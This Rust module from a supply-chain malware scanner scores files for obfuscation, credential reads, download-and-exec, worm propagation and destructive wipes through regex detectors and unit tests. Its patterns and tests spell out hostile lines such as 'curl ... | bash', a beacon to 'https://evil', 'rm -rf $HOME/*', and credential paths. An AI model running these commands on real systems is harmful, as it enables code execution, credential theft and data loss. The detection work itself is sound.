//! Value-independent capability scoring over an auto-run [`Surface`].
//!
//! Each detector recognizes a behavior the malware *must* perform (obfuscation,
//! credential reads, network egress, process spawn, download-and-exec,
//! self-propagation, on-chain C2 resolution, trailing payload, destructive
//! wipe, fake-font). Patterns are lexical; there is no AST. [`gate`] applies a
//! conservative, surface-aware fire decision — see the design spec §5/§6/§7.

use std::sync::OnceLock;

use regex::Regex;

use crate::matchers::shannon_entropy;
use crate::surface::Surface;

#[derive(Debug, Default, Clone, PartialEq)]
pub struct CapabilityScore {
    /// High-confidence structural obfuscation (injection markers + eval, the ESM re-entry
    /// shim, decoder-name / charcode-array tells). Sufficient for the FP-sensitive priors.
    pub obfuscation: bool,
    /// Density signal (long non-URL line or high-entropy tail). Fires on legitimately dense
    /// benign content too, so it is NOT sufficient for the ConfigFile/DerivedScript prior —
    /// only the more permissive lifecycle/hook surfaces treat it as a fire signal.
    pub high_entropy: bool,
    pub credential_access: bool,
    pub network_egress: bool,
    pub process_spawn: bool,
    pub magic_mismatch: bool,
    pub download_exec: bool,
    pub propagation: bool,
    pub on_chain_resolve: bool,
    pub trailing_code: bool,
    pub destructive_wipe: bool,
    /// A lone outbound fetch/download token (curl/wget/fetch/iwr/…). Only consumed by the
    /// TasksJson gate — a folder-open task that reaches out is suspicious on its own.
    pub remote_fetch: bool,
    pub evidence: Vec<String>,
}

macro_rules! lazy_re {
    ($f:ident, $pat:expr) => {
        fn $f() -> &'static Regex {
            static R: OnceLock<Regex> = OnceLock::new();
            R.get_or_init(|| Regex::new($pat).unwrap())
        }
    };
}

// --- Obfuscation ---
lazy_re!(global_dyn_re, r"(?:global|globalThis|process)\s*(?:\[|\.)\s*['\w!]+\s*\]?\s*=");
// The re-entry shim is `global[...]=require` / `global.x=module`. A bare
// `createRequire(import.meta.url)` is legitimate ESM interop and is NOT flagged
// on its own — the reassignment is the value-independent tell.
lazy_re!(esm_shim_re, r"global\s*(?:\[[^\]]+\]|\.\w+)\s*=\s*(?:require|module)\b");
lazy_re!(charcode_re, r"String\.fromCharCode\s*\(\s*\d+(?:\s*,\s*\d+){3,}");
lazy_re!(decoder_re, r"_\$_[0-9a-f]{4,}");
lazy_re!(evalish_re, r"\beval\s*\(|new\s+Function\s*\(|\batob\s*\(");

/// High-confidence lexical obfuscation: an injection marker with an eval/Function/atob sink,
/// the ESM re-entry shim, or the family decoder-name / charcode-array tells. These are
/// specific to injected payloads, so they alone may satisfy the FP-sensitive priors.
fn obfuscation(content: &str) -> bool {
    // The bare charcode/decoder check below subsumes those two alternatives from the
    // marker-scoped branch, so only `evalish` need be paired with the injection marker.
    if global_dyn_re().is_match(content) && evalish_re().is_match(content) {
        return true;
    }
    if esm_shim_re().is_match(content) {
        return true;
    }
    charcode_re().is_match(content) || decoder_re().is_match(content)
}

/// Density signals: an unusually long non-URL line, or a high-entropy tail. These fire on
/// legitimately dense benign content too (embedded base64 keys, SRI/integrity hashes,
/// minified bundles), so they are NOT high-confidence obfuscation. Only the more permissive
/// auto-run surfaces (lifecycle scripts, git hooks) treat them as a fire signal; the
/// FP-sensitive ConfigFile/DerivedScript priors require structural `obfuscation` instead.
fn high_entropy(content: &str) -> bool {
    if content
        .lines()
        .any(|l| l.len() > 500 && !l.contains("data:") && !l.trim_start().starts_with("http"))
    {
        return true;
    }
    let b = content.as_bytes();
    shannon_entropy(&b[b.len().saturating_sub(512)..]) > 7.0
}

// --- CredentialAccess ---
lazy_re!(
    cred_re,
    r"\.aws/credentials|\.ssh/|\.npmrc|\.git-credentials|Object\.keys\(\s*process\.env|process\.env\.(?:NPM_TOKEN|GITHUB_TOKEN|GH_TOKEN|AWS_SECRET|AWS_ACCESS_KEY)|security\s+find-generic-password|Login Data|logins\.json"
);
fn credential_access(content: &str, surface: Surface) -> bool {
    if cred_re().is_match(content) {
        return true;
    }
    matches!(surface, Surface::WorkflowFile) && content.contains("${{ secrets.")
}

// --- NetworkEgress ---
lazy_re!(
    net_re,
    r#"require\(\s*['"](?:https?|net|dgram|tls)['"]|from\s+['"](?:node:)?(?:https?|net|dgram|tls)['"]|\bfetch\s*\(|\baxios\b|XMLHttpRequest|\bWebSocket\b|\bcurl\b|\bwget\b|Invoke-WebRequest|\biwr\b"#
);
// Egress requires an actual outbound-call token (fetch/require('https')/axios/curl/…). A bare
// URL *string literal* is NOT egress — configs legitimately embed redirect destinations and doc
// links (e.g. `destination: 'https://docs.example.com'`). Known C2 domains are caught separately
// by the per-pack IOC-domain check, so this only sheds false positives, not real detections.
fn network_egress(content: &str) -> bool {
    net_re().is_match(content)
}

// --- ProcessSpawn ---
lazy_re!(spawn_re, r"child_process|\bspawn\s*\(|\bexecSync\s*\(|\bexec\s*\(|Bun\.spawn(?:Sync)?\s*\(");
fn process_spawn(content: &str) -> bool {
    spawn_re().is_match(content)
}

// --- MagicMismatch (only meaningful when surface == BinaryAsset) ---
lazy_re!(
    js_tokens_re,
    r"\brequire\s*\(|\beval\s*\(|\bglobal\b|fromCharCode|\bfunction\b|module\.exports"
);
fn magic_mismatch(content: &str, surface: Surface) -> bool {
    matches!(surface, Surface::BinaryAsset) && js_tokens_re().is_match(content)
}

// --- DownloadExec ---
lazy_re!(
    fetch_tok_re,
    r"\bcurl\b|\bwget\b|\bfetch\s*\(|Invoke-WebRequest|\biwr\b|certutil\s+-urlcache|powershell\s+-enc"
);
lazy_re!(
    exec_sink_re,
    r"\|\s*(?:sh|bash)\b|node\s+-e\b|node\s+-\b|chmod\s+\+x|bun\s+run\b|sh\s+-c\b|\beval\s*\("
);
// A file the command downloads to disk (`curl -o x.js`, `> x.sh`) and, separately,
// a file it then executes (`node x.js`). When the same script name appears in both,
// it is download-and-run even without a piped `| sh` sink.
lazy_re!(dl_target_re, r#"(?:-o|-O|--output|>)\s*['"]?([\w./@-]+\.(?:[cm]?js|sh|py|ps1))"#);
lazy_re!(run_target_re, r#"(?:node|bun|sh|bash|python3?|powershell|\.)\s+(?:-\S+\s+)*['"]?([\w./@-]+\.(?:[cm]?js|sh|py|ps1))"#);
fn download_exec(content: &str) -> bool {
    if !fetch_tok_re().is_match(content) {
        return false;
    }
    if exec_sink_re().is_match(content) {
        return true;
    }
    let dls: std::collections::HashSet<&str> = dl_target_re()
        .captures_iter(content)
        .map(|c| c.get(1).unwrap().as_str())
        .collect();
    !dls.is_empty()
        && run_target_re()
            .captures_iter(content)
            .any(|c| dls.contains(c.get(1).unwrap().as_str()))
}

// --- RemoteFetch (a lone outbound fetch/download token; only gates TasksJson auto-run) ---
fn remote_fetch(content: &str) -> bool {
    fetch_tok_re().is_match(content)
}

// --- Propagation ---
// A `--amend` anywhere (the former `commit\s+.*--amend` alternative was subsumed by this).
lazy_re!(amend_re, r"--amend");
// A force-push: every force flag is scoped to a preceding `git push` (consistently — the
// trailing unscoped `-uf` alternative that matched anywhere has been removed).
lazy_re!(forcepush_re, r"push\s+.*(?:--force\b|--force-with-lease\b|-f\b|-uf\b)");
lazy_re!(noverify_re, r"--no-verify");
lazy_re!(
    publish_re,
    // `\bnpm` so `pnpm publish-packages` / `yarn ...` scripts don't false-match the "npm" inside.
    r"\bnpm\s+publish\b|gh\s+api\s+[^\n]*repos|gh\s+repo\s+create\b|gh\s+workflow\b"
);
fn propagation(content: &str, surface: Surface) -> bool {
    let git_conj = amend_re().is_match(content)
        && forcepush_re().is_match(content)
        && noverify_re().is_match(content);
    if git_conj {
        return true;
    }
    let auto_run = matches!(
        surface,
        Surface::LifecycleScript
            | Surface::WorkflowFile
            | Surface::DerivedScript
            | Surface::GitHook
            | Surface::TasksJson
    );
    publish_re().is_match(content) && (auto_run || cred_re().is_match(content))
}

// --- OnChainResolve ---
lazy_re!(
    rpc_re,
    r"eth_call|eth_getTransactionByHash|/v1/accounts/|trongrid|aptoslabs|bsc-dataseed|\x22method\x22\s*:\s*\x22eth_"
);
lazy_re!(xor_re, r"charCodeAt[^;]*\^|\^[^;]*charCodeAt|fromCharCode[^;]*\^");
fn on_chain_resolve(content: &str) -> bool {
    rpc_re().is_match(content) && xor_re().is_match(content) && evalish_re().is_match(content)
}

// --- TrailingCode (ConfigFile / DerivedScript only) ---
/// Byte offset just past the end of the `export default …` / `module.exports = …`
/// statement that starts at `start`. String-aware balanced scan of `(){}[]`, stopping
/// at the matching close, or a `;`/newline at depth 0. This keeps a legitimate
/// multi-line object body from being mistaken for appended payload.
fn export_statement_end(content: &str, start: usize) -> usize {
    let mut depth: i32 = 0;
    let mut seen_open = false;
    let mut quote: Option<char> = None;
    let mut escaped = false;
    for (off, c) in content[start..].char_indices() {
        let abs = start + off;
        if let Some(q) = quote {
            if escaped {
                escaped = false;
            } else if c == '\\' {
                escaped = true;
            } else if c == q {
                quote = None;
            }
            continue;
        }
        match c {
            '\'' | '"' | '`' => quote = Some(c),
            '(' | '{' | '[' => {
                depth += 1;
                seen_open = true;
            }
            ')' | '}' | ']' => {
                depth -= 1;
                if seen_open && depth <= 0 {
                    return abs + c.len_utf8();
                }
            }
            ';' if depth <= 0 => return abs + c.len_utf8(),
            '\n' if depth <= 0 && seen_open => return abs,
            _ => {}
        }
    }
    content.len()
}

fn trailing_code(content: &str, surface: Surface) -> bool {
    if !matches!(surface, Surface::ConfigFile | Surface::DerivedScript) {
        return false;
    }
    let marker = ["export default", "module.exports"]
        .iter()
        .filter_map(|m| content.rfind(m))
        .max();
    let start = match marker {
        Some(i) => i,
        None => return false,
    };
    let end = export_statement_end(content, start);
    // Everything after the completed export statement — on the same line or the
    // following lines — is candidate trailing payload. Exclude comments and further
    // import/export declarations (legitimate named exports are not injected code).
    let meaningful: String = content[end..]
        .lines()
        .map(|l| l.trim())
        .filter(|t| {
            !t.is_empty()
                && *t != ";"
                && !t.starts_with("//")
                && !t.starts_with("/*")
                && !t.starts_with('*')
                && !t.starts_with("export ")
                && !t.starts_with("import ")
        })
        .collect::<Vec<_>>()
        .join("\n");
    // A multi-line expression export (e.g. `export default cond ? withA(...) : withB(...)`)
    // continues past the apparent statement end; content that BEGINS with an expression-
    // continuation operator (a ternary `:`/`?`, a method-chain `.`, `||`/`&&`, a comma or a
    // closing bracket) is part of the export, not injected payload. Real payloads start a new
    // statement (`;`, `(`, `!`, an identifier, …), never these.
    let continues = meaningful.chars().next().is_some_and(|c| ":?.,)]}|&".contains(c));
    meaningful.len() > 8 && meaningful.contains('(') && !continues
}

// --- DestructiveWipe ---
lazy_re!(
    wipe_re,
    r"rm\s+-rf\s+(?:\$HOME|~|/)|shred\s+-[nuvz]|cipher\s+/W:|del\s+/F\s+/Q"
);
fn destructive_wipe(content: &str) -> bool {
    wipe_re().is_match(content)
}

/// The double-base64 exfil-staging blob shape: content begins `eyJ` (base64 of
/// `{"`) and contains `==`. A standalone repo-level check (not a `Surface`).
pub fn is_exfil_staging(content: &str) -> bool {
    let head: String = content.trim_start().chars().take(16).collect();
    head.starts_with("eyJ") && content.contains("==")
}

/// Score every capability for a piece of content on a given surface.
pub fn score(content: &str, surface: Surface) -> CapabilityScore {
    let mut s = CapabilityScore::default();
    let mark = |cond: bool, field: &mut bool, label: &str, ev: &mut Vec<String>| {
        if cond {
            *field = true;
            ev.push(label.to_string());
        }
    };
    mark(obfuscation(content), &mut s.obfuscation, "obfuscation", &mut s.evidence);
    mark(high_entropy(content), &mut s.high_entropy, "high-entropy", &mut s.evidence);
    mark(
        credential_access(content, surface),
        &mut s.credential_access,
        "credential-access",
        &mut s.evidence,
    );
    mark(
        network_egress(content),
        &mut s.network_egress,
        "network-egress",
        &mut s.evidence,
    );
    mark(process_spawn(content), &mut s.process_spawn, "process-spawn", &mut s.evidence);
    mark(
        magic_mismatch(content, surface),
        &mut s.magic_mismatch,
        "magic-mismatch",
        &mut s.evidence,
    );
    mark(download_exec(content), &mut s.download_exec, "download-exec", &mut s.evidence);
    mark(propagation(content, surface), &mut s.propagation, "propagation", &mut s.evidence);
    mark(
        on_chain_resolve(content),
        &mut s.on_chain_resolve,
        "on-chain-resolve",
        &mut s.evidence,
    );
    mark(
        trailing_code(content, surface),
        &mut s.trailing_code,
        "trailing-code",
        &mut s.evidence,
    );
    mark(
        destructive_wipe(content),
        &mut s.destructive_wipe,
        "destructive-wipe",
        &mut s.evidence,
    );
    // Scored last so it never displaces the primary evidence label in `signature_id`.
    mark(remote_fetch(content), &mut s.remote_fetch, "remote-fetch", &mut s.evidence);
    s
}

/// Conservative, surface-aware fire decision (design spec §7).
pub fn gate(surface: Surface, s: &CapabilityScore) -> bool {
    let behavioral = s.credential_access
        || s.network_egress
        || s.process_spawn
        || s.on_chain_resolve
        || s.download_exec;
    match surface {
        Surface::ConfigFile => {
            // Spec §7: an obfuscation/trailing-code prior AND a behavioral capability.
            // The prior is what makes entry files FP-safe (§4); download_exec/on_chain_resolve
            // are behavioral members of `behavioral`, so they fire *with* a prior, never alone.
            let prior = s.obfuscation || s.trailing_code;
            prior && behavioral
        }
        Surface::DerivedScript => {
            let prior = s.obfuscation || s.trailing_code;
            (prior && behavioral)
                || s.download_exec
                || s.propagation
                || s.destructive_wipe
                || s.on_chain_resolve
        }
        Surface::LifecycleScript => {
            s.download_exec
                || s.propagation
                || s.on_chain_resolve
                || s.obfuscation
                || s.high_entropy
                || (s.credential_access && s.network_egress)
                || s.destructive_wipe
        }
        Surface::WorkflowFile => {
            (s.credential_access && s.network_egress) || s.propagation || s.download_exec
        }
        // The folderOpen auto-run precondition is enforced by the scanner; here a lone
        // remote-fetch token fires too (a folder-open task that reaches out is suspicious
        // on its own), alongside download_exec/propagation. Spec §7 TasksJson row.
        Surface::TasksJson => s.download_exec || s.propagation || s.remote_fetch,
        Surface::GitHook => {
            s.download_exec
                || s.propagation
                || (s.credential_access && s.network_egress)
                || s.obfuscation
                || s.high_entropy
        }
        Surface::PropagationScript => s.propagation || s.download_exec || s.destructive_wipe,
        Surface::BinaryAsset => s.magic_mismatch,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::surface::Surface;

    // --- core detectors (Task 4) ---
    #[test]
    fn obfuscation_global_bracket() {
        assert!(score("global['!']='8-270-2';var _$_1e42=[];", Surface::ConfigFile).obfuscation);
    }
    #[test]
    fn obfuscation_dot_and_fromcharcode() {
        assert!(
            score("global.o='5';String.fromCharCode(104,105,106,107,108);", Surface::ConfigFile)
                .obfuscation
        );
    }
    #[test]
    fn obfuscation_esm_shim() {
        assert!(score(
            "global['r']=require;const require=createRequire(import.meta.url);",
            Surface::DerivedScript
        )
        .obfuscation);
    }
    #[test]
    fn config_with_embedded_key_and_url_is_not_obfuscation_fp() {
        // A benign config embedding a dense base64 key (a long, high-entropy line) plus a URL
        // literal must NOT fire. A density signal alone is not high-confidence obfuscation and
        // must not satisfy the FP-sensitive ConfigFile prior. (Was a Critical false positive.)
        let key = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AaZ0/+".repeat(20);
        let cfg = format!(
            "export default {{ publicKey: '{key}', databaseURL: 'https://app.firebaseio.com' }};\n"
        );
        let s = score(&cfg, Surface::ConfigFile);
        assert!(!s.obfuscation, "dense/high-entropy content is not high-confidence obfuscation");
        assert!(
            !gate(Surface::ConfigFile, &s),
            "a benign key-bearing config must not fire on a bare density signal"
        );
    }

    #[test]
    fn clean_config_not_obfuscated() {
        assert!(!score("export default { plugins: { tailwindcss: {} } };\n", Surface::ConfigFile)
            .obfuscation);
    }
    #[test]
    fn credential_access_detected() {
        assert!(score(
            "const t=process.env.NPM_TOKEN;fs.readFileSync('~/.aws/credentials')",
            Surface::LifecycleScript
        )
        .credential_access);
    }
    #[test]
    fn network_egress_detected() {
        assert!(score("const https=require('https');fetch('http://x')", Surface::ConfigFile)
            .network_egress);
    }
    #[test]
    fn process_spawn_detected() {
        assert!(score("child_process.spawn('node',['-e',code])", Surface::DerivedScript).process_spawn);
    }
    #[test]
    fn magic_mismatch_only_on_binary_asset() {
        assert!(score("var x=require('fs');eval(y)", Surface::BinaryAsset).magic_mismatch);
        assert!(!score("var x=require('fs');eval(y)", Surface::ConfigFile).magic_mismatch);
    }

    // --- new detectors (Task 5) ---
    #[test]
    fn download_exec_detected() {
        assert!(score("curl http://x/t | bash", Surface::TasksJson).download_exec);
        assert!(score("const r=await fetch(u);eval(await r.text())", Surface::LifecycleScript)
            .download_exec);
        assert!(!score("curl http://x -o out.txt", Surface::LifecycleScript).download_exec);
    }
    #[test]
    fn propagation_git_conjunction() {
        let sh = "git commit --amend --no-verify && git push -uf --no-verify";
        assert!(score(sh, Surface::PropagationScript).propagation);
        assert!(!score("git push origin main", Surface::PropagationScript).propagation);
    }
    #[test]
    fn propagation_publish_context_gated() {
        assert!(score("npm publish --access public", Surface::LifecycleScript).propagation);
        assert!(!score("npm publish --access public", Surface::PropagationScript).propagation);
    }
    #[test]
    fn propagation_forcepush_flags_require_push_context() {
        // Consistent scoping: the git-worm conjunction needs a real `git push` with a force
        // flag. A bare `-uf` token with no `push` must NOT count (it was an inconsistent
        // unscoped alternation while --force/-f required a preceding `push`).
        let real = "git commit --amend --no-verify\ngit push -uf --no-verify";
        assert!(score(real, Surface::PropagationScript).propagation);
        let no_push = "run --amend --no-verify\nsome -uf token";
        assert!(!score(no_push, Surface::PropagationScript).propagation);
    }

    #[test]
    fn on_chain_resolve_detected() {
        let js = "fetch('https://api.trongrid.io/v1/accounts/T../transactions').then(r=>{for(i=0;i<n;i++)o+=String.fromCharCode(b.charCodeAt(i)^k);eval(o)})";
        assert!(score(js, Surface::ConfigFile).on_chain_resolve);
    }
    #[test]
    fn trailing_code_after_module_body() {
        let cfg = "export default { plugins: {} }\n;(function(){require('https')})()";
        assert!(score(cfg, Surface::ConfigFile).trailing_code);
        assert!(!score("export default { plugins: {} }\n", Surface::ConfigFile).trailing_code);
    }

    #[test]
    fn trailing_code_false_on_multiline_config_with_url() {
        // A benign multi-line config whose object body spans lines and embeds a URL
        // must NOT be treated as trailing payload (was a false Critical).
        let cfg = "import { defineConfig } from 'vite'\nexport default defineConfig({\n  plugins: [react()],\n  server: { proxy: { '/api': 'https://api.example.com' } },\n})\n";
        assert!(!score(cfg, Surface::ConfigFile).trailing_code);
        assert!(!gate(Surface::ConfigFile, &score(cfg, Surface::ConfigFile)));
    }

    #[test]
    fn trailing_code_true_on_same_line_append() {
        // Payload appended on the SAME line after the export body must still trip.
        let cfg = "module.exports={};(function(){fetch('http://x')})()";
        assert!(score(cfg, Surface::ConfigFile).trailing_code);
    }

    #[test]
    fn propagation_ignores_pnpm_publish_false_match() {
        // `pnpm publish-packages` (a script name) must NOT match the `npm publish` propagation
        // tell: the regex must be word-boundaried so it never fires on the "npm" inside "pnpm".
        let wf = "env:\n  NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}\n- run: pnpm publish-packages\n";
        assert!(!score(wf, Surface::WorkflowFile).propagation);
        assert!(!gate(Surface::WorkflowFile, &score(wf, Surface::WorkflowFile)));
        // A real `npm publish` still fires.
        assert!(score("- run: npm publish --access public\n", Surface::WorkflowFile).propagation);
    }

    #[test]
    fn config_url_literal_alone_is_not_network_egress() {
        // A benign config that only embeds URL string literals (redirect destinations, doc
        // links) with NO fetch/require/axios token is not network egress on a ConfigFile.
        let cfg = "const DOCS = 'https://docs.example.com';\nexport default { redirects: [{ destination: 'https://code.example.com' }] };\n";
        assert!(!score(cfg, Surface::ConfigFile).network_egress);
        // A real fetch / node-module require still fires.
        assert!(score("fetch('https://x')", Surface::ConfigFile).network_egress);
        assert!(score("const https = require('https')", Surface::ConfigFile).network_egress);
    }

    #[test]
    fn trailing_code_false_on_ternary_expression_export() {
        // A multi-line ternary export (plugin-wrapped Next.js config) must NOT read as trailing
        // payload: the `: g(...)` branch continues the export expression, it is not injected code.
        let cfg = "const nextConfig = {};\nexport default cond\n  ? withSentryConfig(withMDX(nextConfig), opts)\n  : withMDX(nextConfig);\n";
        assert!(!score(cfg, Surface::ConfigFile).trailing_code);
        // A real payload appended after a completed export still trips.
        assert!(score(
            "export default {}\n;(function(){fetch('http://x')})()",
            Surface::ConfigFile
        )
        .trailing_code);
    }

    #[test]
    fn obfuscation_ignores_bare_create_require() {
        // Legitimate ESM interop is not obfuscation on its own.
        assert!(!score(
            "import { createRequire } from 'module';\nconst require = createRequire(import.meta.url);\nexport default {};\n",
            Surface::ConfigFile
        )
        .obfuscation);
    }

    #[test]
    fn propagation_on_tasksjson_publish() {
        assert!(score("npm publish --access public", Surface::TasksJson).propagation);
    }

    #[test]
    fn download_exec_download_then_run() {
        assert!(score("curl -o boot.js http://x/b && node boot.js", Surface::LifecycleScript).download_exec);
        // Unrelated download + a build step running a different local file must not fire.
        assert!(!score("curl -o logo.png http://x/l && node build.js", Surface::LifecycleScript).download_exec);
    }
    #[test]
    fn destructive_wipe_detected() {
        assert!(score("rm -rf $HOME/*", Surface::PropagationScript).destructive_wipe);
        assert!(score("shred -uz ~/.bash_history", Surface::GitHook).destructive_wipe);
    }
    #[test]
    fn exfil_staging_double_base64() {
        assert!(is_exfil_staging("eyJhIjoiYiJ9\n==trailing"));
        assert!(!is_exfil_staging("{\"a\":\"b\"}"));
    }

    // --- gate matrix (Task 6) ---
    fn sc(f: impl Fn(&mut CapabilityScore)) -> CapabilityScore {
        let mut s = CapabilityScore::default();
        f(&mut s);
        s
    }
    #[test]
    fn gate_config_requires_prior_and_behavior() {
        assert!(!gate(Surface::ConfigFile, &sc(|s| s.obfuscation = true)));
        assert!(gate(
            Surface::ConfigFile,
            &sc(|s| {
                s.obfuscation = true;
                s.network_egress = true;
            })
        ));
        assert!(gate(
            Surface::ConfigFile,
            &sc(|s| {
                s.trailing_code = true;
                s.process_spawn = true;
            })
        ));
    }
    #[test]
    fn gate_config_lone_download_exec_or_onchain_does_not_fire() {
        // Spec §7: ConfigFile fires only on (obfuscation OR trailing_code) AND a behavioral
        // capability. A lone download_exec / on_chain_resolve with no prior must NOT fire —
        // that prior is exactly what makes entry files FP-safe (spec §4).
        assert!(!gate(Surface::ConfigFile, &sc(|s| s.download_exec = true)));
        assert!(!gate(Surface::ConfigFile, &sc(|s| s.on_chain_resolve = true)));
        // With a prior present, both still fire (they are behavioral capabilities).
        assert!(gate(
            Surface::ConfigFile,
            &sc(|s| {
                s.trailing_code = true;
                s.download_exec = true;
            })
        ));
    }

    #[test]
    fn gate_lifecycle_behavior_no_obfuscation_needed() {
        assert!(gate(Surface::LifecycleScript, &sc(|s| s.download_exec = true)));
        assert!(gate(Surface::LifecycleScript, &sc(|s| s.propagation = true)));
        assert!(!gate(Surface::LifecycleScript, &sc(|s| s.process_spawn = true)));
    }
    #[test]
    fn gate_propagation_script() {
        assert!(gate(Surface::PropagationScript, &sc(|s| s.propagation = true)));
        assert!(!gate(Surface::PropagationScript, &sc(|s| s.process_spawn = true)));
    }
    #[test]
    fn gate_tasksjson_lone_remote_fetch() {
        // A folderOpen tasks.json that fetches a remote resource with no exec sink must fire —
        // spec §7's TasksJson row includes a lone remote-fetch token, not only download_exec.
        assert!(gate(Surface::TasksJson, &score("curl https://evil/beacon", Surface::TasksJson)));
        // A bare fetch token on a ConfigFile still must NOT fire (unchanged, FP-safe).
        assert!(!gate(Surface::ConfigFile, &score("curl https://evil/beacon", Surface::ConfigFile)));
    }

    #[test]
    fn gate_binary_asset() {
        assert!(gate(Surface::BinaryAsset, &sc(|s| s.magic_mismatch = true)));
    }
    #[test]
    fn gate_git_hook_no_bare_spawn() {
        assert!(!gate(Surface::GitHook, &sc(|s| s.process_spawn = true)));
        assert!(gate(Surface::GitHook, &sc(|s| s.download_exec = true)));
    }
}
